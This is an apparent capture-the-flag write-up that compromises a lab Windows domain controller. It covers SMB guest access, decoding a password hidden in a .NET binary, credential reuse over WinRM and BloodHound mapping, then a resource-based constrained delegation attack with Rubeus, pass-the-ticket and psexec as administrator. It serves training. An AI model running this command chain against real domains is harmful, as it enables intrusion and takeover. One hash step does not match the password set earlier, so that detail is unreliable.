
![[support logo.png]]



We start by enumerating the target

```
nmap -sVC 10.129.56.105 -oN scan.txt
```

```
<SNIP>

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-16 10:06:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

We first start by enumerating SMB shares on the machin with built-in account guest

```
 nxc smb "10.129.56.105" -u 'guest' -p '' --shares
```
![Pasted image 20251116114803](Images/Pasted%20image%2020251116114803.png)

We see that we can read on the share "**support-tools** anonymously so let's connecting to that share.

```
smbclient --user 'guest' "//10.129.56.105/support-tools"
```

![Pasted image 20251116151006](Images/Pasted%20image%2020251116151006.png)

We see a bunch of executable but one is not a known one, **UserInfo.exe** so we download it

![Pasted image 20251116151314](Images/Pasted%20image%2020251116151314.png)

The file is a .NET file, let's dissembly it using the tool **ILSpy**, but we need ton install it first

```
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
```
We `unzip` the donwloaded file and then we go to `artefact/linux-x64` to launch **ILSpy**

Once the tool is loaded, we import the UserInfo.exe file

![Pasted image 20251116151909](Images/Pasted%20image%2020251116151909.png)

Let's see what we can find.

We notice in ILSpy that the file has a function called **LdapQuery** which shows that a ldap query is made to **support.htb**

![Pasted image 20251116153230](Images/Pasted%20image%2020251116153230.png)

So we add it to our /etc/hosts file

```
echo '10.129.56.105 support.htb' >> /etc/hosts
```
Let's get back to the tool and see if we can find interessting function.

![Pasted image 20251116154048](Images/Pasted%20image%2020251116154048.png)

There is a function **Protected** that contains an encoded password.

Asking chatgpt, he gave me the following script

```
import base64

enc="0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key=b"armando"
data=base64.b64decode(enc)
out=bytearray(len(data))
for i, b in enumerate(data):
    out[i]= (b ^ key[i%len(key)]) ^ 0xDF
out.decode(errors='replace')
```

Which gave me the password `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

After testing our cred with netcrackexec, we see that those creds are binded to user ldap

```
nxc smb "10.129.56.105" -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares
```
![Pasted image 20251116154740](Images/Pasted%20image%2020251116154740.png)

Then we can use the tool **ldapsearch** in order to get info on the ldap server.

```
ldapsearch -H ldap://10.129.56.105 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

```
<SNIP>

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support

<SNIP>
```
We found this entry with an interesting field called **info** and containing this string

`Ironside47pleasure40Watchful`

Maybe it's the password for the user, let's try this combo with evil-winrm

```
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i "10.129.56.105"
```
![Pasted image 20251116160937](Images/Pasted%20image%2020251116160937.png)

It worked ! Let's grap the flag located in his Desktop Folder and move on.

Now that we got valid creds for a user, we can use bloodhound to find a way to escalate our privileges.

First, we use  bloodhound.py to collect data

```
bloodhound.py -c All -d "support.htb" -u "support" -p "Ironside47pleasure40Watchful" -ns "10.129.56.105"
```

and we start the neo4j database
```
neo4j start 
```
We can now launch bloodhound and import our data

![Pasted image 20251116172547](Images/Pasted%20image%2020251116172547.png)

We have the right `GenericAll` on the computer **DC.SUPPORT.HTB**, which means we can perform a **Ressource Bases Constrained Delegation** on the target to escalte our privileges.

In order to do so we need 3 scripts, **powermad.ps1**, **powerview.ps1** and **rubeus.exe**

We upload them to our target via evil-winrm then we import the powershell modules

```
 upload /workspace/powerview.ps1
```
```
. ./powerview.ps1
```
```
 upload /workspace/powermad.ps1
```
```
. ./powermad.ps1
```
```
 upload /workspace/rubeus.exe
```

We need know to check if we can add machine to our target

```
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota
```

![Pasted image 20251116174338](Images/Pasted%20image%2020251116174338.png)

Great, we can add up to 10 machine.
Then we need to verify that `msds-allowedtoactonbehalfofotheridentity` is empty

```
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

![Pasted image 20251116174452](Images/Pasted%20image%2020251116174452.png)

It's empty, so that means we can perform our attack. 

I followed the hacktricks tutorial (https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html)

First we create a fake computer object on the domain

```
New-MachineAccount -MachineAccount hacked -Password $(ConvertTo-SecureString 'password!' -AsPlainText -Force)
```
![Pasted image 20251116175229](Images/Pasted%20image%2020251116175229.png)

Now that we created the fake computer, we need to configure the Resource-based Constrained Delegation

```
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount hacked$
```
```
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

We can check now if it worked

```
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```
![Pasted image 20251116180941](Images/Pasted%20image%2020251116180941.png)

It worked 

We continue the attack with **rubeus** to get the hashes

```
.\Rubeus.exe hash /password:password /user:hacked$ /domain:support.htb
```

![Pasted image 20251116181057](Images/Pasted%20image%2020251116181057.png)

We need to use the **rc4_hmac** hash `8846F7EAEE8FB117AD06BDD830B7586C` to impersonate the admin user

```
.\rubeus.exe s4u /user:hacked$ /rc4:8846F7EAEE8FB117AD06BDD830B7586C /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```
![Pasted image 20251118115325](Images/Pasted%20image%2020251118115325.png)

We grab the last ticket and we must remove whitespace in order to use that ticket.
For that i used CyberChef

![Pasted image 20251118115424](Images/Pasted%20image%2020251118115424.png)

Next i created a file `ticket.kirbi.b64` on my machine

```
echo 'doIGYDCCBlygAwIBBaEDAgEWooIFcjCCBW5hggVqMIIFZqADAgEFoQ0bC1NVUFBPUlQuSFRCo<SNIP>Gw5kYy5zdXBwb3J0Lmh0Yg==' > ticket.kirbi.b64
```

Next i add to decode the base64 ticket and put it in a file `ticket.kirbi`

```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

Now i used the tool **ticketConverter.py** to convert my ticket to ccache format in order to do login as administrator using the **Pass the Ticket** method

```
ticketConverter.py ticket.kirbi ticket.ccache
```

And to finish we connect with psexec.py and we grab the root flag

```
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

![Pasted image 20251118120340](Images/Pasted%20image%2020251118120340.png)




